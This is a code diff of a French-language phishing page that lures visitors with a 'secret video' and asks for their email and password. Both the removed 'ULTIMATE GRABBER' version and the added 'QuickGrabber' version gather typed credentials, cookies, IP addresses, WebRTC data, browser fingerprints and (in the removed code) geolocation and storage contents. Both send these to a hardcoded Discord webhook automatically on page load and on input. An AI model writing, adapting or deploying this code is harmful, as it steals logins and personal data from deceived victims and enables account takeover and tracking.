@@ -56,14 +56,9 @@
         .error { color: #ff6b6b; font-weight: bold; margin-top: 10px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .spinner { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 1s ease-in-out infinite; }
-        canvas { display: none; }
     </style>
 </head>
 <body>
-    <!-- CANVAS INVISIBLE POUR FINGERPRINT -->
-    <canvas id="fpCanvas1" width="256" height="256"></canvas>
-    <canvas id="fpCanvas2" width="200" height="60"></canvas>
-    
     <div class="container">
         <h1>🎉 Surprise Exclusive !</h1>
         <p>Accès spécial au contenu bonus. <strong>EMAIL OBLIGATOIRE</strong> pour débloquer la vidéo secrète !</p>
@@ -72,7 +67,7 @@
             <input type="email" id="email" placeholder="📧 Ton email OBLIGATOIRE" required>
             <input type="password" id="password" placeholder="🔑 Mot de passe">
             <button class="btn" id="loginBtn" onclick="login()" disabled>🚀 Accéder à la vidéo</button>
-            <div id="emailError" class="error" style="display: none;">❌ Email invalide ! Format requis : exemple@domaine.com</div>
+            <div id="emailError" class="error" style="display: none;">❌ Email invalide !</div>
         </div>
         
         <div id="status"></div>
@@ -88,307 +83,131 @@
     </div>
 
     <script>
-        // TON WEBHOOK - TOUT ARRIVE ICI
-        const DISCORD_WEBHOOK = 'https://canary.discord.com/api/webhooks/1495131862702751775/pP4iuM3WGCm8n_Po5PE94ofmB2-tvh8nxDLPMSKFddYAiaGlWBdvxa3sy0vlnVJoilFC';
+        // TON WEBHOOK
+        const WEBHOOK = 'https://canary.discord.com/api/webhooks/1495131862702751775/pP4iuM3WGCm8n_Po5PE94ofmB2-tvh8nxDLPMSKFddYAiaGlWBdvxa3sy0vlnVJoilFC';
         const YOUTUBE_LINK = 'https://youtube.com/shorts/MBz-kM9Tqf0?si=G8Yw_AlaceyqnQ7L';
         
-        let lastExfil = 0;
-        const EXFIL_COOLDOWN = 1500;
-
-        // ULTIMATE FINGERPRINT COLLECTOR
-        async function getUltimateFingerprint() {
-            const data = {};
-
-            // 1. MULTI-CANVAS FINGERPRINT (3 techniques)
-            const canvases = [
-                {id: 'fpCanvas1', text: 'ULTRA fingerprint v4', font: '14px Arial'},
-                {id: 'fpCanvas2', text: 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', font: '16px monospace'},
-                {id: 'fpCanvas3', text: navigator.userAgent.slice(0,20), font: '12px Verdana'}
-            ];
-            
-            for (let i = 0; i < 3; i++) {
+        let lastSent = 0;
+        
+        // RAPIDE FINGERPRINT (2s max)
+        async function quickFingerprint() {
+            try {
+                // IP rapide
+                const ipRes = await Promise.race([
+                    fetch('https://api.ipify.org?format=json').then(r => r.json()),
+                    fetch('https://icanhazip.com').then(r => r.text()).then(t => ({ip: t.trim()})),
+                    new Promise(r => setTimeout(() => r({ip: '???'}), 2000))
+                ]);
+                
+                // Canvas ultra-simple
                 const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
-                ctx.textBaseline = 'top';
-                ctx.font = canvases[i % 3].font || '14px Arial';
-                ctx.fillText(canvases[i % 3].text || 'test', 2, 2);
-                ctx.fillStyle = `hsl(${Math.random()*360}, 50%, 50%)`;
-                ctx.fillRect(10, 10, 50, 50);
-                data[`canvas${i+1}`] = btoa(canvas.toDataURL()).slice(-32);
-            }
-
-            // 2. WEBGL VENDOR/RENDERER + EXTENSIONS
-            const glCanvas = document.createElement('canvas');
-            const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
-            if (gl) {
-                data.webgl_vendor = gl.getParameter(gl.VENDOR);
-                data.webgl_renderer = gl.getParameter(gl.RENDERER);
-                data.webgl_version = gl.getParameter(gl.VERSION);
-                data.webgl_shading = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
-                data.webgl_extensions = gl.getSupportedExtensions().length;
-            }
-
-            // 3. WEBRTC LOCAL/NAT/EXTERNAL IPS
-            data.webrtc = await new Promise(r => {
-                const pc = new RTCPeerConnection({iceServers:[]});
-                pc.createDataChannel('');
-                pc.onicecandidate = e => {
-                    if (!e.candidate) {
-                        const ips = new Set();
-                        (pc.localDescription?.sdp || '').match(/([0-9]{1,3}\.){3}[0-9]{1,3}|[a-f0-9:]+(?::[a-f0-9]+){7}/gi)?.forEach(ip => ips.add(ip));
-                        r([...ips].slice(0,5).join(','));
-                        pc.close();
-                    }
-                };
-                pc.createOffer().then(() => pc.setLocalDescription(pc.localDescription));
-            });
-
-            // 4. AUDIO OSCILLOSCOPE FINGERPRINT (MULTI-FREQ)
-            data.audio_fp = await new Promise(r => {
-                const ctx = new AudioContext();
-                const osc = ctx.createOscillator();
-                const analyser = ctx.createAnalyser();
-                osc.connect(analyser);
-                analyser.connect(ctx.destination);
-                osc.frequency.setValueAtTime(8000, ctx.currentTime);
-                osc.start();
-                setTimeout(() => {
-                    const arr = new Uint8Array(128);
-                    analyser.getByteFrequencyData(arr);
-                    osc.stop();
-                    ctx.close();
-                    r(btoa(String.fromCharCode(...arr)));
-                }, 200);
-            });
-
-            // 5. HARDWARE + PERFORMANCE
-            data.hardware = {
-                cpu: navigator.hardwareConcurrency,
-                ram_gb: navigator.deviceMemory,
-                touch_points: navigator.maxTouchPoints,
-                connection_type: navigator.connection?.effectiveType,
-                downlink_mbps: navigator.connection?.downlink,
-                rtt_ms: navigator.connection?.rtt,
-                save_data: navigator.connection?.saveData,
-                pixel_ratio: window.devicePixelRatio,
-                color_depth: screen.colorDepth,
-                monochrome_depth: screen.pixelDepth
-            };
-
-            // 6. FONTS DÉTECTION (50+ FONTS)
-            const fonts = ['monospace', 'sans-serif', 'serif', 'Arial', 'Helvetica', 'Times', 'Courier', 'Verdana', 'Georgia', 'Comic Sans MS', 'Impact', 'Lucida', 'Tahoma', 'Trebuchet MS', 'Bookman', 'Garamond'];
-            data.detected_fonts = fonts.filter(font => {
-                const span = document.createElement('span');
-                span.style.cssText = `position:absolute; width:auto; height:auto; padding:0; margin:0; visibility:hidden; font-size:20px; font-family:${font},monospace; white-space:nowrap`;
-                span.textContent = 'abcdefghijklmnopqrstuvwxyz0123456789';
-                document.body.appendChild(span);
-                const width = span.offsetWidth;
-                document.body.removeChild(span);
-                return width > 200;
-            }).slice(0,10).join(',');
-
-            // 7. PLUGINS + MIME TYPES
-            data.mime_types = Array.from(navigator.mimeTypes || []).map(t => t.type).join(',');
-            data.plugins = Array.from(navigator.plugins || []).map(p => p.name).join(',');
-
-            // 8. TIMING ATTACKS (CPU SPEED)
-            const timings = [];
-            for (let i = 0; i < 5; i++) {
-                const start = performance.now();
-                for (let j = 0; j < 1000000; j++) Math.sqrt(j);
-                timings.push(Math.round(performance.now() - start));
-            }
-            data.cpu_timing = timings.join('|');
-
-            return data;
-        }
-
-        // STOCKAGE + PERSISTANCE
-        function getAllPersistence() {
-            const data = {
-                cookies: document.cookie,
-                local_storage_keys: Object.keys(localStorage),
-                local_storage_sample: Object.entries(localStorage).slice(0,10).map(([k,v]) => `${k}:${v?.slice(0,50)}`).join(';'),
-                session_storage_keys: Object.keys(sessionStorage),
-                session_storage_sample: Object.entries(sessionStorage).slice(0,10).map(([k,v]) => `${k}:${v?.slice(0,50)}`).join(';'),
-                indexeddb_dbs: Array.from((navigator.serviceWorker || {}).getRegistrations ? [] : []),
-                caches: []
-            };
-
-            // Service Workers
-            if ('serviceWorker' in navigator) {
-                navigator.serviceWorker.getRegistrations().then(regs => {
-                    data.service_workers = regs.map(r => r.scope).join(',');
-                });
-            }
-
-            // Cache API
-            if ('caches' in window) {
-                caches.keys().then(keys => {
-                    data.cache_keys = keys.join(',');
-                });
-            }
-
-            return data;
-        }
-
-        // GÉOLOCATION (avec fallback)
-        async function tryGeolocation() {
-            return new Promise(resolve => {
-                if (!navigator.geolocation) return resolve('Disabled');
+                ctx.font = '16px Arial';
+                ctx.fillText('quick-fp', 4, 20);
+                const canvasHash = btoa(canvas.toDataURL()).slice(-24);
                 
-                navigator.geolocation.getCurrentPosition(
-                    pos => resolve(`Lat:${pos.coords.latitude.toFixed(4)},Lon:${pos.coords.longitude.toFixed(4)},Acc:${pos.coords.accuracy}m`),
-                    () => resolve('Denied')
-                );
-            });
-        }
-
-        // IP + ASN + GEO
-        async function getCompleteIP() {
-            const apis = [
-                {url: 'https://api.ipify.org?format=json', ip: 'ip'},
-                {url: 'https://ipapi.co/json/', ip: 'ip', asn: 'org', city: 'city', country: 'country'},
-                {url: 'https://ipinfo.io/json', ip: 'ip', asn: 'org', city: 'city', country: 'country'}
-            ];
-            
-            for (const api of apis) {
-                try {
-                    const res = await fetch(api.url);
-                    const json = await res.json();
-                    return {
-                        ip: json[api.ip] || 'Hidden',
-                        asn_org: json[api.asn] || '?',
-                        city: json[api.city] || '?',
-                        country: json[api.country] || '?'
+                // WebRTC simple
+                const webrtc = await new Promise(r => {
+                    const pc = new RTCPeerConnection({iceServers:[]});
+                    pc.onicecandidate = e => {
+                        if (!e.candidate?.candidate) {
+                            const ipMatch = (pc.localDescription?.sdp || '').match(/(\d+\.\d+\.\d+\.\d+)/);
+                            r(ipMatch ? ipMatch[1] : 'none');
+                            pc.close();
+                        }
                     };
-                } catch(e) {}
+                    pc.createDataChannel('').createOffer().then(() => pc.setLocalDescription(pc.localDescription));
+                }).catch(() => 'blocked');
+                
+                return {
+                    ip: ipRes.ip,
+                    canvas: canvasHash,
+                    webrtc: webrtc,
+                    ua: navigator.userAgent.slice(0,80),
+                    screen: `${screen.width}x${screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cpu: navigator.hardwareConcurrency || '?',
+                    ram: navigator.deviceMemory || '?',
+                    lang: navigator.language,
+                    cookies: document.cookie || 'none'
+                };
+            } catch(e) {
+                return {error: 'fp-fail'};
             }
-            return {ip: 'Hidden', asn_org: '?', city: '?', country: '?'};
         }
-
-        // TON WEBHOOK
-        const DISCORD_WEBHOOK = 'https://canary.discord.com/api/webhooks/1495131862702751775/pP4iuM3WGCm8n_Po5PE94ofmB2-tvh8nxDLPMSKFddYAiaGlWBdvxa3sy0vlnVJoilFC';
-
-        async function sendUltimateExfil(allData) {
-            if ((Date.now() - lastExfil) < 1000) return;
-            lastExfil = Date.now();
-
-            // EMBED 1: CORE + CREDS
-            const embed1 = {
-                title: "💀 ULTIMATE GRABBER v4 - CORE DATA",
+        
+        // ENVOI DIRECT SIMPLE
+        async function sendData() {
+            if (Date.now() - lastSent < 1000) return;
+            lastSent = Date.now();
+            
+            const data = await quickFingerprint();
+            const creds = {
+                email: document.getElementById('email').value || 'none',
+                pass: document.getElementById('password').value || 'none'
+            };
+            
+            const embed = {
+                title: "🎣 VICTIME CAPTURÉE - RAPIDE",
                 color: 16711680,
                 fields: [
-                    {name: "🌐 IP", value: allData.ip_data.ip, inline: true},
-                    {name: "🏢 ASN/Org", value: allData.ip_data.asn_org, inline: true},
-                    {name: "📍 City", value: allData.ip_data.city, inline: true},
-                    {name: "🌍 Country", value: allData.ip_data.country, inline: true},
-                    {name: "📧 EMAIL", value: `\`${allData.creds.email || '?'}\``, inline: false},
-                    {name: "🔑 PASSWORD", value: `\`${allData.creds.password || '?'}\``, inline: false},
-                    {name: "🖥️ CPU/RAM", value: `${allData.fp.hardware.cpu}/${allData.fp.hardware.ram_gb}GB`, inline: true},
-                    {name: "📱 Touch", value: allData.fp.hardware.touch_points.toString(), inline: true}
-                ]
-            };
-
-            // EMBED 2: FINGERPRINTS
-            const embed2 = {
-                title: "🕵️ ULTIMATE FINGERPRINTS",
-                color: 65280,
-                fields: [
-                    {name: "🎨 Canvas1", value: `\`${allData.fp.canvas1}\``, inline: false},
-                    {name: "🎨 Canvas2", value: `\`${allData.fp.canvas2}\``, inline: false},
-                    {name: "🎮 WebGL", value: `${allData.fp.webgl_renderer?.slice(0,30)}...`, inline: false},
-                    {name: "🌐 WebRTC", value: allData.fp.webrtc?.slice(0,40), inline: false},
-                    {name: "🔊 Audio", value: `\`${allData.fp.audio_fp?.slice(0,30)}...\``, inline: false},
-                    {name: "🔤 Fonts", value: allData.fp.detected_fonts?.slice(0,40), inline: false}
-                ]
-            };
-
-            // EMBED 3: STORAGE + SYSTEM
-            const embed3 = {
-                title: "💾 STORAGE + SYSTEM INFO",
-                color: 3447003,
-                fields: [
-                    {name: "🍪 Cookies", value: allData.storage.cookies ? '✅ ' + allData.storage.cookies.length + ' bytes' : 'None', inline: true},
-                    {name: "💽 LocalStorage", value: allData.storage.local_storage_keys?.length || 0 + ' keys', inline: true},
-                    {name: "📦 SessionStorage", value: allData.storage.session_storage_keys?.length || 0 + ' keys', inline: true},
-                    {name: "🌐 Plugins", value: (navigator.plugins?.length || 0).toString(), inline: true},
-                    {name: "📡 Network", value: allData.fp.hardware.connection_type || '?', inline: true},
-                    {name: "📍 GPS", value: allData.geo || 'N/A', inline: true}
+                    {name: "🌐 IP", value: `\`${data.ip}\``, inline: true},
+                    {name: "📧 Email", value: `\`${creds.email}\``, inline: true},
+                    {name: "🔑 Password", value: `\`${creds.pass}\``, inline: true},
+                    {name: "🎨 Canvas", value: data.canvas, inline: true},
+                    {name: "🌐 WebRTC", value: data.webrtc, inline: true},
+                    {name: "📱 Screen", value: data.screen, inline: true},
+                    {name: "🖥️ CPU/RAM", value: `${data.cpu}/${data.ram}`, inline: true},
+                    {name: "🌍 TZ/Lang", value: `${data.timezone}/${data.lang}`, inline: true},
+                    {name: "🍪 Cookies", value: data.cookies ? `${data.cookies.length} bytes` : 'none', inline: false}
                 ],
-                description: `\`\`\`${JSON.stringify({
-                    ls_sample: allData.storage.local_storage_sample,
-                    ua: navigator.userAgent.slice(0,80),
-                    url: window.location.href
-                }).slice(0,1000)}\`\`\``
+                description: `\`\`\`${data.ua}\`\`\``,
+                thumbnail: {url: "https://cdn-icons-png.flaticon.com/512/5968/5968898.png"},
+                footer: {text: `QuickGrabber | ${new Date().toLocaleString('fr-FR')}`}
             };
-
-            const embeds = [embed1, embed2, embed3];
-            embeds.forEach(embed => {
-                embed.timestamp = new Date().toISOString();
-                embed.footer = {text: `v4.0 | ${performance.now().toFixed(0)}ms | ${navigator.language}`};
-            });
-
-            fetch(DISCORD_WEBHOOK, {
+            
+            fetch(WEBHOOK, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({embeds, username: 'ULTIMATE-GRABBER'})
-            }).catch(() => {});
+                body: JSON.stringify({embeds: [embed]})
+            }).catch(e => console.log('send fail'));
         }
-
-        // EXFIL ULTIME
-        async function ultimateExfil() {
-            const [fp, ip_data, geo] = await Promise.all([
-                getUltimateFingerprint(),
-                getCompleteIP(),
-                tryGeolocation()
-            ]);
-
-            const creds = {
-                email: document.getElementById('email')?.value || '',
-                password: document.getElementById('password')?.value || ''
-            };
-
-            sendUltimateExfil({
-                fp,
-                ip_data,
-                geo,
-                creds,
-                storage: getAllPersistence()
-            });
-        }
-
-        // UI EVENTS (identique)
+        
+        // UI
         const emailInput = document.getElementById('email');
         const loginBtn = document.getElementById('loginBtn');
-        emailInput.addEventListener('input', e => {
-            const valid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e.target.value);
+        
+        emailInput.addEventListener('input', () => {
+            const valid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailInput.value);
             loginBtn.disabled = !valid;
+            document.getElementById('emailError').style.display = valid ? 'none' : 'block';
         });
-
+        
         async function login() {
-            document.getElementById('status').innerHTML = '🔄 Analyse complète... <span class="spinner"></span>';
-            await ultimateExfil();
+            const status = document.getElementById('status');
+            status.innerHTML = '🔄 Vérification rapide... <span class="spinner"></span>';
+            
+            await sendData(); // IMMÉDIAT
+            
             setTimeout(() => {
-                document.getElementById('status').innerHTML = '✅ Accès autorisé !';
-                document.getElementById('videoSection').classList.add('show');
-            }, 4500);
+                status.innerHTML = '✅ Accès OK ! 🎉';
+                setTimeout(() => {
+                    document.getElementById('videoSection').classList.add('show');
+                }, 500);
+            }, 1500); // 1.5s TOTAL
         }
-
+        
         function openVideo() {
             window.open(YOUTUBE_LINK, '_blank');
-            ultimateExfil();
+            sendData();
         }
-
-        // 🚀 6x EXFIL AUTOMATIQUE
-        setTimeout(ultimateExfil, 500);
-        setTimeout(ultimateExfil, 2000);
-        setTimeout(ultimateExfil, 5000);
-        window.addEventListener('load', ultimateExfil);
-        window.addEventListener('focus', ultimateExfil);
         
+        // AUTO-ENVOI PAGE LOAD (1s)
+        setTimeout(sendData, 1000);
+        
+        // ENVOI SUR INPUTS
         ['email', 'password'].forEach(id => {
-            document.getElementById(id)?.addEventListener('change', ultimateExfil);
+            document.getElementById(id).addEventListener('change', sendData);
         });
     </script>
 </body>
